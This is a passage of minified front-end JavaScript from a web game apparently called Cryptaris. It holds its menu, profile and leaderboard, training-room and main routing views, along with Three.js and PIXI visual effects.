i=parseInt($(e.currentTarget).attr("rel")[0])+1;appModel.trigger("mission-tile-click"),router.navigate("!/mission/"+i),appModel.trigger(appModel.events.HARD_ROUTE)},handleMouseOver:function(){ns.audioProxy.triggerEvent("training_rollover")},goToChapter:function(e){console.log("MissionMain.goToChapter",e),this.state="chapter",this.$(".scrollable-menu").hide();var i=user.getMissionState();this.currentChapter=new Chapter({data:e,$el:this.$(".chapter"),difficulty:i.difficulty})},goToMenu:function(){this.state="menu";var e=this;"IE"===client.browser.name?(this.$el.show(),this.$(".scrollable-menu").perfectScrollbar({suppressScrollX:!0})):this.$el.hide();var i=storage.getItem("next_level_index");i&&(storage.removeItem("next_level_index"),webGLMain.navToChallenge(i,function(){$(e.$menuTiles[i]).click()}))},destroy:function(){ns.audioProxy.triggerEvent("mission_stop")}});module.exports=MissionMain;
},{"./chapter/chapter-main":77,"models/app-model":46,"router":47,"shared/flickertransition":112,"shared/namespace":140,"shared/user":213,"shared/utils/client/client":217,"shared/utils/storage":223,"views/base-view":63,"views/webgl/webgl-main":106}],80:[function(require,module,exports){
var BaseView=require("views/base-view"),appModel=require("models/app-model"),MobileReconGame=require("shared/mobile-recon/mobile-recon-main"),MobileRecon=BaseView.extend({template:"mobile-recon",id:"mobile-recon",initialize:function(){},enter:function(e){this.render(),this.game=new MobileReconGame({$el:this.$el,appModel:appModel}),this.game.enter(e)},exit:function(e){this.game.exit(e)}});module.exports=MobileRecon;
},{"models/app-model":46,"shared/mobile-recon/mobile-recon-main":138,"views/base-view":63}],81:[function(require,module,exports){
var BaseView=require("views/base-view");require("shared/lib/pxloader/PxLoader"),require("shared/lib/pxloader/PxLoaderImage"),require("shared/lib/pxloader/PxLoaderVideo");var Preloader=BaseView.extend({template:"preloader",initialize:function(e){var a=this;_.extend(this,e),this.render();var i=e.imgs||[],r=e.videos||[],d=e.onComplete||function(){},o=new window.PxLoader;i.forEach(function(e){o.addImage(e)}),r.forEach(function(e){o.addImage(e)}),o.addCompletionListener(function(){a.exit(),d()}),o.start(),this.$el.addClass("fade-in")},exit:function(){var e=this;this.$el.removeClass("fade-in").addClass("fade-out"),setTimeout(function(){e.$el.css({display:"none"})},300)}});module.exports=Preloader;
},{"shared/lib/pxloader/PxLoader":126,"shared/lib/pxloader/PxLoaderImage":127,"shared/lib/pxloader/PxLoaderVideo":128,"views/base-view":63}],82:[function(require,module,exports){
var BaseView=require("views/base-view"),user=require("shared/user"),appModel=require("models/app-model"),Prompt=require("shared/utils/prompt"),ScoreMeter=require("views/score-meter"),textFlicker=require("shared/utils/text-flicker"),analytics=require("shared/analytics"),client=require("shared/utils/client/client"),ns=require("shared/namespace"),Profile=BaseView.extend({className:"section profile",template:"profile",id:"profile",initialize:function(){_.bindAll(this,"onResize","doResize","onChangedLogin"),user.on("change:logged_in",this.onChangedLogin)},onChangedLogin:function(){var e=user.get("logged_in");this.$(".login-btn").html(e?"log out":"log in"),this.$(".status-text").html(e?user.get("name"):"save your progress")},populateUserScore:function(){if(user.get("logged_in")){var e=user.get("mission_score")?user.get("mission_score"):"0",o="";o+='<div class="rank">...</div>',o+='<div class="name">'+user.get("username")+"</div>",o+='<div class="score">'+e+"</div>",this.$(".user-score").html(o),this.$(".user-score").css({display:"block"})}else this.$(".user-score").css({display:"none"})},showTab:function(e){var o=this,i=this.$(".tabs .tab.active");i.removeClass("active"),TweenLite.to(i,.3,{display:"none",autoAlpha:0,onComplete:function(){TweenLite.to(o.$(".tabs ."+e+"-tab"),.5,{display:"block",autoAlpha:1})}}),this.$(".tab-button").removeClass("active"),this.$("."+e+"-button").addClass("active"),this.$(".tabs ."+e+"-tab").addClass("active")},showProfile:function(){var e=this;this.showTab("profile"),this.populateUserScore(),["science","technology","engineering","math"].forEach(function(e,o){var i=this.$(".profile-user-stem .category."+e+" .label");i.html(i.attr("data-label")),textFlicker(i[0],{delay:1+.1*o});var s=this.$(".profile-user-stem .category."+e+" .score-value"),t=user.get(e);s.html(Math.round(100*t));var r=this.$(".profile-user-stem .category."+e+" .score-ratio-bar");TweenLite.fromTo(r,2,{width:0},{width:100*t+"%",ease:Power3.easeOut,delay:.1*o+1})}.bind(this));var o=this.$(".profile-score-meters .score-meters-sizer");o.html("");var i=130,s=new ScoreMeter({$parent:o,size:i,max:1e4,value:user.get("mission_score"),label:"score",displayType:"number"}),t=new ScoreMeter({$parent:o,size:i,max:100,value:100*user.get("skill"),label:"skill"}),r=new ScoreMeter({$parent:o,size:i,max:100,value:100*user.get("accuracy"),label:"accuracy"}),n=new ScoreMeter({$parent:o,size:i,max:100,value:100*user.get("speed"),label:"speed"});[s,t,r,n].forEach(function(e,o){setTimeout(function(){e.show()},300*o+3e3)}),$.get("/api/leaderboard",function(o){$.each(o.scores,function(o,i){i.user_id===user.get("id")&&e.$(".user-score .rank").html(i.rank)})}),this.doResize()},showJobs:function(){this.showTab("jobs"),this.doResize()},showLeaderboard:function(){var e=this;this.showTab("leaderboard"),this.populateUserScore(),$.get("/api/leaderboard",function(o){console.log("/api/leaderboard",o),this.leaderboard=o.scores;var i="";$.each(this.leaderboard,function(o,s){s.user_id===user.get("id")&&e.$(".user-score .rank").html(s.rank),i+='<div class="score-item">',i+='<div class="rank">'+s.rank+"</div>",i+='<div class="name">'+s.username+"</div>",i+='<div class="score">'+s.score+"</div>",i+="</div>"}),e.$(".scores .scroller").html(i),e.doResize()})},doResize:function(){this.onResize(),setTimeout(this.onResize,100),setTimeout(this.onResize,300),setTimeout(this.onResize,1e3)},onResize:function(){var e=40;void 0!==client.device.type&&(e=0);var o=this.$(".tabs .profile-tab");o.css({height:window.innerHeight-o.offset().top-e});var i=this.$(".scores");i.css({height:window.innerHeight-i.offset().top-e});var s=this.$(".jobs-tab .jobs");s.each(function(o,i){$(i).css({height:window.innerHeight-$(i).offset().top-e})}),this.$(".scroller").perfectScrollbar("update")},events:{"click .profile-button":"onClickProfileButton","click .leaderboard-button":"onClickLeaderboardButton","click .jobs-button":"onClickJobsButton","click .login-btn":"onClickLogin","click .job":"onClickJob","click .view-all-button":"onClickViewAll","mouseenter .jobs-button":"onMouseHover","mouseenter .login-btn":"onMouseHover","mouseenter .job":"onMouseHover","mouseenter .view-all-button":"onMouseHover"},onMouseHover:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_BTN_HOVER)},onClickJob:function(e){analytics.trackEvent("click","job",$(e.currentTarget).find(".label").html()),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_BTN_CLICK)},onClickViewAll:function(){analytics.trackEvent("click","more jobs","profile"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_BTN_CLICK)},onClickLogin:function(){user.get("logged_in")?user.logout():appModel.trigger(appModel.events.SECTION.CHANGE,{section:"login"}),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_BTN_CLICK)},onClickJobsButton:function(){this.showJobs(),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_BTN_CLICK)},onClickProfileButton:function(){user.get("logged_in")?this.showProfile():new Prompt({message:"Please log in to view your profile.",accept:"log in",onAccept:function(){appModel.trigger(appModel.events.SECTION.CHANGE,{section:"login"})},onCancel:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_LOGIN_CANCEL)}}).show(),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_BTN_CLICK)},onClickLeaderboardButton:function(){this.showLeaderboard(),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.PROFILE_BTN_CLICK)},enter:function(e){this.render(),this.onChangedLogin(),ns.audioProxy.triggerEvent("profile_start"),this.$(".scroller").perfectScrollbar({suppressScrollX:!0}),window.addEventListener("resize",this.onResize),user.get("logged_in")===!0?this.showProfile():this.showLeaderboard(),this.setElement(this.$el),this.$el.css({display:"block"}),this.$el.removeClass("fade-out").addClass("fade-in"),setTimeout(function(){e()},500)},exit:function(e){ns.audioProxy.triggerEvent("profile_stop"),window.removeEventListener("resize",this.onResize),this.$el.removeClass("fade-in").addClass("fade-out"),setTimeout(function(){e()},300)}});module.exports=Profile;
},{"models/app-model":46,"shared/analytics":107,"shared/namespace":140,"shared/user":213,"shared/utils/client/client":217,"shared/utils/prompt":221,"shared/utils/text-flicker":224,"views/base-view":63,"views/score-meter":83}],83:[function(require,module,exports){
var orange=16698114,gray=5723991,ScoreMeter=function(e){function a(){var e=PIXI.CanvasRenderer;v=new e(n,n,{transparent:!0,resolution:window.devicePixelRatio||1,antialias:!0}),v.view.style.width=1*v.width/v.resolution+"px",v.view.style.height=1*v.height/v.resolution+"px",s.append(v.view),i.append(s),u=new PIXI.Container,u.addChild(x);for(var a=23;a>=0;a--){var o=I;a%5===0&&(o=P);var r=2*Math.PI*a/24-Math.PI/2,c=new PieDot(o,r,f,y);u.addChild(c.graphics),w.push(c)}for(var l=31;l>=0;l--){var h=2*Math.PI*Math.round(24*Math.random())/24-Math.PI/2,d=2*Math.PI*Math.round(24*Math.random())/24-Math.PI/2,p=new PieLine(h,d,y,f);u.addChild(p.graphics),M.push(p)}t()}function t(){g||(window.requestAnimationFrame(t),v.render(u))}var n=e.size||150,i=e.$parent,o=e.displayType||"percent",r=e.value,c=e.max,l=e.label,s=$('<div class="score-meter">'),h=$('<div class="text"></div>'),d=$('<div class="value">0</div>'),p=$('<div class="label">'+l+"</div>");"percent"===o&&d.addClass("percent"),h.append(d),h.append(p),s.append(h);var u,v,g=!1,P=3,I=2,w=[],M=[],f=.5*n-P-1,y=.5*n,x=new PIXI.Graphics;_.extend(this,{show:function(e){e=void 0!==e?e:4,t();var a={value:0};TweenLite.to(a,e,{value:1,ease:Power3.easeInOut,onUpdate:function(){var e=a.value*Math.PI*2*r/c-Math.PI/2;x.clear(),x.lineStyle(1.5,orange,.4),x.arc(.5*n,.5*n,f,-Math.PI/2,e);try{x.currentPath.shape.closed=!1}catch(t){console.log("bugggg")}x.lineStyle(1.5,orange,0),x.arc(.5*n,.5*n,f,e,-Math.PI/2,!0),d.html(Math.round(a.value*r)),w.forEach(function(a){a.angle<e?a.setColor(orange):a.setColor(5723991)}),M.forEach(function(a){a.angle1<e&&a.angle2<e?a.setOpacity(.1):a.setOpacity(0)})}})},hide:function(){g=!0}}),a()},PieDot=function(e,a,t,n){function i(){o.clear(),o.beginFill(r.color,.8),o.drawCircle(r.x,r.y,r.size),o.endFill()}var o=new PIXI.Graphics,r=this;_.extend(this,{color:gray,size:e,angle:a,x:Math.cos(a)*t+n,y:Math.sin(a)*t+n,setColor:function(e){this.color!==e&&(this.color=e,this.update())},graphics:o,update:i}),i()},PieLine=function(e,a,t,n){var i=new PIXI.Graphics,o=this,r=function(e){return new PIXI.Point(Math.cos(e)*n+t,Math.sin(e)*n+t)},c=function(){i.clear(),i.lineStyle(1.5,orange,o.opacity);var t=r(e),n=r(a);i.moveTo(t.x,t.y),i.lineTo(n.x,n.y)};_.extend(this,{angle1:e,angle2:a,graphics:i,update:c,opacity:0,setOpacity:function(e){TweenLite.to(this,.3,{opacity:e,onUpdate:function(){c()}})}}),c()};module.exports=ScoreMeter;
},{}],84:[function(require,module,exports){
var router=require("router"),dataInterface=require("shared/datainterface"),BaseView=require("views/base-view"),appModel=require("models/app-model"),client=require("shared/utils/client/client"),GameShell=require("views/gameshell/gameshell-main"),ns=require("shared/namespace"),flickerTransition=require("shared/flickertransition"),twoPI=2*Math.PI,TrainingRoom=BaseView.extend({template:"training-room-main",className:"section training-room",initialize:function(){this.render({games:appModel.get("app-data")["training-room"].games}),_.bindAll(this,"onMouseDown","onMouseUp","onMouseMove","onTRRotate","onNavHover"),this.$tiles=this.$(".menu-item-tile"),this.$tiles.on("mousedown",this.onMouseDown),this.$tiles.on("mouseenter",this.onMouseOver),this.$(".num").on("click",this.onClickNum).on("mouseenter",this.onNavHover),this.$(".tri-btn.r").on("click",this.onClickNext),this.$(".tri-btn.l").on("click",this.onClickPrev),appModel.on(appModel.events.TR_ROTATE,this.onTRRotate),this.$nums=this.$(".indicator .nums"),this.$numsnums=this.$(".indicator .nums .num"),this.$ticks=this.$(".indicator .ticks")},onTRRotate:function(e){var t=(e+.1*twoPI)/twoPI;t%=1,0>t&&(t+=1);var i=this.$numsnums.length/3,o=Math.floor(t*i)+i;o!==this.focusedIndex&&(this.focusedIndex=o,this.$numsnums.removeClass("focused"),this.$numsnums[o].classList.add("focused"),this.$numsnums[o+i].classList.add("focused"),this.$numsnums[o-i].classList.add("focused"));var s=100*-t/3-100/3;TweenLite.set(this.$nums,{x:s+"%"}),this.$ticks.css("background-position",1e3*-t+"px");var n=Math.min(.5*window.innerWidth,400);this.$numsnums.each(function(e,t){var i=$(t).offset().left+60,o=Math.abs(.5*window.innerWidth-i),s=n-o;s>0?t.style.opacity=Math.min(1,s/n):t.style.opacity=0})},onClickNum:function(e){var t=parseInt($(e.currentTarget).find(".label span").html());appModel.trigger(appModel.events.TR_FOCUS,t),console.log(t),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.TRAINING_ROOM_NAV_CLICK)},onClickNext:function(){console.log("next"),appModel.trigger(appModel.events.TR_FOCUS,"next"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.TRAINING_ROOM_NAV_CLICK)},onClickPrev:function(){console.log("prev"),appModel.trigger(appModel.events.TR_FOCUS,"prev"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.TRAINING_ROOM_NAV_CLICK)},enter:function(e){this.$el.css({display:"block"});var t=window.location.hash.split("/").slice(1);if(2===t.length){var i=appModel.get("app-data")["training-room"].games,o=parseInt(t[1])-1,s=_.find(i,function(e){return parseInt(e.slug[0])===o});this.goToGame(s)}else ns.audioProxy.triggerEvent("trainingroom_start"),this.goToMenu();e()},exit:function(e){"game"===this.state?flickerTransition("out",function(){e()}):(this.$el.css("display","none"),e())},onMouseDown:function(e){this.moved=!1,this.currentRel=$(e.currentTarget).attr("rel")[0],this.$tiles.on("mousemove",this.onMouseMove),$(document.body).on("mouseup",this.onMouseUp)},onMouseMove:function(){this.moved=!0},onMouseUp:function(){if($(document.body).off("mouseup",this.onMouseUp),!this.moved){ns.audioProxy.triggerEvent("main_click"),ns.audioProxy.triggerEvent("trainingroom_stop_fast");var e=parseInt(this.currentRel)+1;appModel.trigger("tr-tile-click",e),router.navigate("!/training-room/"+e),appModel.trigger(appModel.events.HARD_ROUTE)}},onNavHover:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.TRAINING_ROOM_NAV_HOVER)},onMouseOver:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.TRAINING_ROOM_GRID_HOVER)},goToGame:function(e){this.state="game",this.$(".main").hide(),this.$el.show(),dataInterface.getGame(e.slug,function(e){this.gameshell=new GameShell({data:e,$el:this.$(".gameshell"),difficulty:0}),this.listenTo(this.gameshell,"next",function(){router.navigate("!/training-room"),appModel.trigger(appModel.events.HARD_ROUTE)});var t=this;this.listenTo(this.gameshell,"win",function(e){t.gameshell.showResult(!0,e)}),this.listenTo(this.gameshell,"lose",function(e){t.gameshell.showResult(!1,e)})}.bind(this))},showResult:function(){},goToMenu:function(){this.state="menu","IE"===client.browser.name?(this.$(".scrollable-menu").css({display:"block"}),this.$(".scrollable-menu").perfectScrollbar({suppressScrollX:!0}),this.$(".indicator").css({display:"none"}),this.$el.css({display:"block"}),this.$tiles.off("mousedown",this.onMouseDown),this.$tiles.on("mousedown",this.onMouseDown)):this.$el.css({"pointer-events":"none"})},destroy:function(){this.remove(),ns.audioProxy.triggerEvent("trainingroom_stop")}});module.exports=TrainingRoom;
},{"models/app-model":46,"router":47,"shared/datainterface":111,"shared/flickertransition":112,"shared/namespace":140,"shared/utils/client/client":217,"views/base-view":63,"views/gameshell/gameshell-main":68}],85:[function(require,module,exports){
var router=require("router"),BaseView=require("views/base-view"),sequence=require("shared/utils/sequence"),dataInterface=require("shared/datainterface"),user=require("shared/user"),client=require("shared/utils/client/client"),ns=require("shared/namespace"),analytics=require("shared/analytics"),paths=require("shared/paths"),stub=require("shared/stub"),appModel=require("models/app-model"),events=appModel.events,Header=require("views/header/header-main"),Footer=require("views/footer/footer-main"),Security=require("views/esi"),Mission=require("views/mission/mission-main"),TrainingRoom=require("views/training-room/training-room-main"),Profile=require("views/profile/profile-main"),About=require("views/about/about-main"),MainMenu=require("views/main-menu/main-menu-main"),Home=require("views/home/home-main"),Login=require("views/login/login-main"),MobileRecon=require("views/mobile-recon/mobile-recon-main"),webGLMain=require("views/webgl/webgl-main"),Preloader=require("./preloader"),Glitch=require("utils/glitch"),flickerTransition=require("shared/flickertransition"),viewCache={},ViewMain=BaseView.extend({template:"app",stemRemoteToken:0,initialize:function(e){console.log("ViewMain.initialize",e),"mobile"===client.device.type?document.documentElement.classList.add("mobile"):"tablet"===client.device.type&&document.documentElement.classList.add("tablet"),"iOS"===client.os.name&&parseInt(client.os.version)>=9&&document.documentElement.classList.add("ios-9"),this.model=appModel,this.stemRemoteToken=e.token,this.render(),void 0!==client.device.type&&$("body").one("click",function(){console.log("requesting fullscreen");var e=this;e.requestFullscreen?e.requestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen?e.webkitRequestFullscreen():e.msRequestFullscreen&&e.msRequestFullscreen()}),sequence([{fn:this.checkEnvironment.bind(this)},{fn:this.startPreloader.bind(this)},{fn:this.getData.bind(this)},{fn:this.getLoginStatus.bind(this)},{fn:this.bindEvents.bind(this)},{fn:this.buildViews.bind(this)},{fn:this.buildWebGL.bind(this)},{fn:this.setupSecurity.bind(this)}],{args:{},completed:this.finishedInit.bind(this)})},finishedInit:function(){console.log("ViewMain.finishedInit"),router.start(),setTimeout(function(){this.header.enter(),this.footer.enter()}.bind(this),500),window.glitch=new Glitch;var e=null===window.location.search.match("no-sound"),i=void 0===client.device.type;e&&i&&this.loadSounds()},checkEnvironment:function(e){console.log("ViewMain.checkEnvironment"),client.determineExperience().then(function(i){appModel.set("experience",i),"standard"===i?window.location.href="/standard/":"fallback"===i&&(window.location.href="/upgrade-msg/"),setTimeout(e,1)})["catch"](function(e){console.log(e)})},startPreloader:function(e){console.log("ViewMain.startPreloader"),this.preloader=new Preloader({$el:this.$(".preloader"),imgs:[paths.IMGS+"site-webgl/about.jpg",paths.IMGS+"site-webgl/star.png",paths.IMGS+"site-webgl/dot.png",paths.IMGS+"site-webgl/greebles1.jpg",paths.IMGS+"site-webgl/greebles2.jpg",paths.IMGS+"site-webgl/sun.png",paths.IMGS+"site-webgl/title-w-2.png"],videos:[paths.IMGS+"site-webgl/title-cryptaris.mp4"],onComplete:function(){e()}}),appModel.trigger(events.PRELOADER.START)},getData:function(e){dataInterface.getData(function(i){appModel.set("app-data",i),e()}.bind(this))},getLoginStatus:function(e){console.log("ViewMain.getLoginStatus"),user.autoLogin(function(){e()})},bindEvents:function(e){this.listenTo(appModel,events.SECTION.CHANGE,this.handleEventChangeSection),this.listenTo(appModel,events.SECTION.ROUTE,this.changeSection),this.listenTo(appModel,events.HARD_ROUTE,this.hardRoute),e()},buildViews:function(e){console.log("ViewMain.buildViews"),this.createViewCache(),this.header=new Header({$el:this.$("#header-container")}),this.footer=new Footer({$el:this.$("#footer-container")}),e()},buildWebGL:function(e){console.log("ViewMain.buildWebGL");var i=window.location.hash.split("/").slice(1),n=-1!==i.indexOf("training-room")&&2===i.length,t=-1!==i.indexOf("mission")&&2===i.length,o=-1!==i.indexOf("mobile-recon");if(n||t||o)return void e();var r={home:viewCache.home.$el.toArray(),"main-menu":viewCache["main-menu"].$el.toArray(),login:viewCache.login.$el.toArray(),mission:viewCache.mission.$el.find(".menu-item-tile").toArray(),"training-room":viewCache["training-room"].$el.find(".menu-item-tile").toArray(),about:viewCache.about.$el.toArray(),profile:viewCache.profile.$el.toArray()};webGLMain.init({$parent:this.$("#webgl"),sectionElements:r}),e()},setupSecurity:function(e){this._security=new Security({parent:$("body"),app:this,enabled:!1}),e()},loadSounds:function(e){e=e||function(){};var i,n=window.location.hash.split("/")[1],t="mission"===n||"training-room"===n;if(t){var o=parseInt(window.location.hash.split("/")[2])-1;isNaN(o)?t=!1:i=stub.mission.chapters[o].game.slug}var r={type:t?"game":"site",game:i};ns.audioProxy.init(function(){},r)},handleEventChangeSection:function(e){router.navigate("!/"+e.section,{trigger:!1}),this.changeSection(e)},changeSection:function(e){var i,n=e.section;webGLMain.navToSection(e.section);var t={home:"Home",mission:"Mission","training-room":"Training",profile:"Profile","main-menu":"Main Menu",login:"Login",about:"About","mobile-recon":"Recon"};if(document.title=t[e.section]+" | Cryptaris",appModel.get("currentSection")){var o=appModel.get("currentSectionView");i=this.createSectionView(n),appModel.set("currentSectionView",i),appModel.set("currentSection",n),o.exit(function(){o.destroy(),"hard"===e.type?this.hardRoute():(this.$("#main").append(i.$el),i.enter(function(){}),analytics.trackPage())}.bind(this))}else i=this.createSectionView(n,e),this.$("#main").append(i.$el),appModel.set("currentSectionView",i),appModel.set("currentSection",n),i.enter(function(){}),analytics.trackPage()},createViewCache:function(){viewCache={home:new Home,"main-menu":new MainMenu,login:new Login,mission:new Mission,"training-room":new TrainingRoom,about:new About,profile:new Profile,"mobile-recon":new MobileRecon}},createSectionView:function(e,i){return appModel.set("route",i),viewCache[e]},hardRoute:function(){ns.audioProxy.triggerEvent("sound_off"),flickerTransition("out",function(){window.location.reload()})}});module.exports=ViewMain;
},{"./preloader":81,"models/app-model":46,"router":47,"shared/analytics":107,"shared/datainterface":111,"shared/flickertransition":112,"shared/namespace":140,"shared/paths":141,"shared/stub":151,"shared/user":213,"shared/utils/client/client":217,"shared/utils/sequence":222,"utils/glitch":60,"views/about/about-main":62,"views/base-view":63,"views/esi":64,"views/footer/footer-main":65,"views/header/header-main":73,"views/home/home-main":74,"views/login/login-main":75,"views/main-menu/main-menu-main":76,"views/mission/mission-main":79,"views/mobile-recon/mobile-recon-main":80,"views/profile/profile-main":82,"views/training-room/training-room-main":84,"views/webgl/webgl-main":106}],86:[function(require,module,exports){
var DotMaterialShader=require("shared/shaders/DotMaterialShader.js"),DotFloor=function(e){function a(){d.on("update",t),n=new THREE.Object3D,s.add(n),n.position.y=-300,l&&(S=8e3,n.position.z=-S/2+800),o=new THREE.ShaderMaterial({uniforms:DotMaterialShader.uniforms,vertexShader:DotMaterialShader.vertexShader,fragmentShader:DotMaterialShader.fragmentShader,depthTest:!1,side:THREE.DoubleSide,blending:THREE.AdditiveBlending,transparent:!0}),DotMaterialShader.uniforms.segmentsX.value=h.segmentsX,DotMaterialShader.uniforms.segmentsY.value=h.segmentsY,DotMaterialShader.uniforms.blur.value=h.blur,DotMaterialShader.uniforms.dotSize.value=h.dotSize,DotMaterialShader.uniforms.lineSize.value=h.lineSize;var e=new THREE.PlaneGeometry(u,S,1,1),a=new THREE.Mesh(e,o);n.add(a),a.rotation.x=-Math.PI/2}function t(){DotMaterialShader.uniforms.lineTime.value+=h.speed/3e3}function r(e,a){TweenMax.to(o,a,{opacity:e})}function i(e){n.visible=e}var n,o,d=e.webGLMain,s=e.parentObj,l=e.isMission,u=4e3,S=4e3,h={on:!1,segmentsX:60,segmentsY:60,dotSize:.04,lineSize:.1,blur:.1,speed:.2};return{init:a,update:t,fade:r,show:i}};module.exports=DotFloor;
},{"shared/shaders/DotMaterialShader.js":144}],87:[function(require,module,exports){
var ImprovedNoise=require("shared/lib/ImprovedNoise"),Mountains=function(e){function o(){t=new THREE.Object3D,d.add(t),t.position.y=-300,l&&(f=8e3,h=3e3,t.position.z=-f/2+800),s=new THREE.PlaneGeometry(w,f,M,M),n(s),E=new THREE.MeshBasicMaterial({vertexColors:THREE.FaceColors,color:3355443});var e=new THREE.Mesh(s,E);t.add(e),e.rotation.x=-Math.PI/2,c=new THREE.MeshBasicMaterial({blending:THREE.AdditiveBlending,transparent:!0,color:16777215,wireframe:!0,wireframeLinewidth:1.5,vertexColors:THREE.VertexColors});var o=s.clone(),r=new THREE.Mesh(o,c);t.add(r),r.rotation.x=-Math.PI/2}function n(e){_.forEach(e.faces,function(o){for(var n=0;3>n;n++){var a=o[u[n]],i=new THREE.Color,t=e.vertices[a],c=r(t);t.z=c*h,i.setHSL(0,0,1*c+.03),o.vertexColors[n]=i}var a=o[u[0]],t=s.vertices[a],c=r(t),E=Math.random()<.1?2.5:1.5;o.color.setHSL(0,0,c*E+.03)})}function r(e){var o,n,r,a=99999;r=.001,n=(v.noise((e.x+a)*r+x,(e.y+a)*r,0)+.5)/2,r=.004,n+=(v.noise((e.x+a)*r+2*x,(e.y+a)*r,0)+.5)/3,o=l?Math.abs(e.x)/(w/2):e.length()/w,n*=o,n*=n;var i=l?.5:.25;return n=Math.min(n,i)}function a(e,o){TweenMax.to(c,o,{opacity:e}),TweenMax.to(E,o,{opacity:e})}function i(e){t.visible=e}var t,s,c,E,d=(e.webGLMain,e.parentObj),l=e.isMission,v=new ImprovedNoise,M=60,h=6e3,w=4e3,f=4e3,u=["a","b","c"],x=1e3*Math.random();return{init:o,fade:a,show:i}};module.exports=Mountains;
},{"shared/lib/ImprovedNoise":123}],88:[function(require,module,exports){
var RipplesShader=require("shared/shaders/RipplesShader.js"),Ripples=function(e){function i(){p.on("update",n),r=new THREE.Object3D,s.add(r),d=new THREE.ShaderMaterial({uniforms:RipplesShader.uniforms,vertexShader:RipplesShader.vertexShader,fragmentShader:RipplesShader.fragmentShader,depthTest:!1,blending:THREE.AdditiveBlending,transparent:!0}),RipplesShader.uniforms.dotSize.value=t.dotSize,RipplesShader.uniforms.lineSize.value=t.lineSize,RipplesShader.uniforms.depth.value=t.depth;var e=new THREE.PlaneGeometry(800,800,10,10),i=new THREE.Mesh(e,d);r.add(i),i.scale.x=i.scale.y=1.5}function n(){r.rotation.z+=.002,RipplesShader.uniforms.noiseTime.value+=t.noiseSpeed/1e3,RipplesShader.uniforms.lineTime.value+=t.lineSpeed/1e3}function a(e,i){TweenMax.to(d,i,{opacity:e})}var r,d,p=e.webGLMain,s=e.parentObj,t={on:!1,lineCount:50,dotSize:.1,lineSize:0,blur:.1,noiseSpeed:5,noiseSize:4,lineSpeed:1,depth:80,vizMode:0};return{init:i,update:n,fade:a}};module.exports=Ripples;
},{"shared/shaders/RipplesShader.js":150}],89:[function(require,module,exports){
var Sky=function(e){function n(){r.on("update",a),i=new THREE.Object3D,c.add(i),d=new THREE.MeshBasicMaterial({transparent:!0,blending:THREE.AdditiveBlending,opacity:0,fog:!1,color:1381653});var e=new THREE.PlaneGeometry(600,600,1,1);o=new THREE.Mesh(e,d),i.add(o),o.scale.x=o.scale.y=600,o.position.z=-12e3}function a(){}function t(e,n,a){TweenMax.to(d,n,{opacity:e,delay:a})}var i,o,d,r=e.webGLMain,c=e.parentObj;return{init:n,fade:t}};module.exports=Sky;
},{}],90:[function(require,module,exports){
var ATUtil=require("shared/utils/general-utils"),StarBars=function(e){function a(){o.on("update",t),r=new THREE.Object3D,s.add(r),n=new THREE.Geometry,i=new THREE.MeshBasicMaterial({color:16777215,blending:THREE.AdditiveBlending,depthTest:!1,transparent:!0,opacity:.2,sizeAttenuation:!0,side:THREE.DoubleSide});var e=1e3,a=new THREE.PlaneGeometry(4,100,1,1);E=[];for(var d=0;l>d;d++){var u=new THREE.Mesh(a,i);u.scale.set(ATUtil.randomRange(.2,2),ATUtil.randomRange(.2,2),1),u.initPos=Math.random(),r.add(u),u.rotation.x=Math.PI/2,u.position.set(ATUtil.randomRange(-e,e),ATUtil.randomRange(-e,e),0),E.push(u),u.scaleOffset=Math.random()}}function t(){u+=d.speed/200;for(var e=0;l>e;e++){var a=E[e],t=(a.initPos+u)%1*3e3-2600;a.position.z=t}}var n,i,r,o=e.webGLMain,s=e.parentObj,d={speed:.8},l=200,E=[],u=0;return{init:a,update:t}};module.exports=StarBars;
},{"shared/utils/general-utils":220}],91:[function(require,module,exports){
var ATUtil=require("shared/utils/general-utils"),Stars=function(e){function t(){l.on("update",r),n=new THREE.Object3D,l.getMainHolder().add(n),o=new THREE.Geometry;var e=THREE.ImageUtils.loadTexture("assets/imgs/site-webgl/star.png");s=new THREE.PointCloudMaterial({size:12,map:e,blending:THREE.AdditiveBlending,depthTest:!1,transparent:!0,opacity:.5}),s.particleHue=Math.random(),s.color=new THREE.Color(16777215),s.color.setHSL(s.particleHue,1,1);for(var t=1e3,a=0;c>a;a++){var i=new THREE.Vector3(ATUtil.randomRange(-t,t),ATUtil.randomRange(-t,t),ATUtil.randomRange(v,u));o.vertices.push(i),i.initPos=Math.random()}d=new THREE.PointCloud(o,s),d.sortParticles=!1,n.add(d)}function r(){for(var e=0;c>e;e++){var t=(o.vertices[e].initPos+.006*l.getVizTime())%1*v-9e3;o.vertices[e].z=t}o.verticesNeedUpdate=!0}function a(e){for(var t=999999,r=0;c>r;r++)o.vertices[r].y<-200&&(o.vertices[r].y+=e?t:-t);o.verticesNeedUpdate=!0}function i(e,t){TweenMax.to(s,t,{opacity:e})}var n,o,s,d,l=e.webGLMain,c=900,u=500,v=12e3;return{init:t,update:r,getGroupHolder:function(){return n},showLowerStars:a,fade:i}};module.exports=Stars;
},{"shared/utils/general-utils":220}],92:[function(require,module,exports){
